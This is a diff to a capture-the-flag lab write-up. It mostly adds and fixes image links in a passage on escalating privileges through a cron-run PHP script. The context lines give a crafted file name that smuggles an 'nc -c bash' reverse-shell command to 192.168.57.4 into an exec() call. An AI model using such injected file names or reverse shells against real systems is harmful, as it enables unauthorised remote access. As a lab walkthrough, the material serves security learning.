@@ -119,13 +119,14 @@ Ways to fix unrestricted file upload issue:
 
 When accessing the user directory "guly" we do not have permission to read the file "user.txt", however reading the file "crontab.guly" we can see that there is a configuration that executes the file "/home/guly/check_attack. php" every 3 minutes.
 ![Crontab](https://github.com/Alta-Cupula/Offensive/blob/main/crontab.png)
+![Chkattack](https://github.com/Alta-Cupula/Offensive/blob/main/chk_attack.png)
 
 So when reading the file check_attacks.php we can see a variable "$path" that has the static value defined as "/var/www/html/uploads", however the variable "value" is created receiving the input of "files".
 The variable "files" is using PHP's "scandir" function passing the value "." meaning it wants to list all files and directories in THIS directory. Which means that if we create a file putting malicious content in the name PHP will probably try to execute it.
 So, creating a file called ";nc -c bash 192.168.57.4 9999;" we can get a reverse shell as guly because in line code would be: "exec("nohup /bin/rm -f /var/www/html/uploads;nc -c bash 192.168.57.4 9999; > /dev/null 2>&1 &")"
 ![Malicious file](https://github.com/Alta-Cupula/Offensive/blob/main/arquivomalicioso.png)
 ![Reverse as guly](https://github.com/Alta-Cupula/Offensive/blob/main/reverseasguly.png)
-![Guly]([path/gulyflag.jpg](https://github.com/Alta-Cupula/Offensive/blob/main/gulyflag.png))
+![Guly](https://github.com/Alta-Cupula/Offensive/blob/main/gulyflag.png)
 
 After being as guly we run the command "sudo -l" and notice that there is a script that we have permission to run as root.
 ![SUID file](https://github.com/Alta-Cupula/Offensive/blob/main/suid.png)
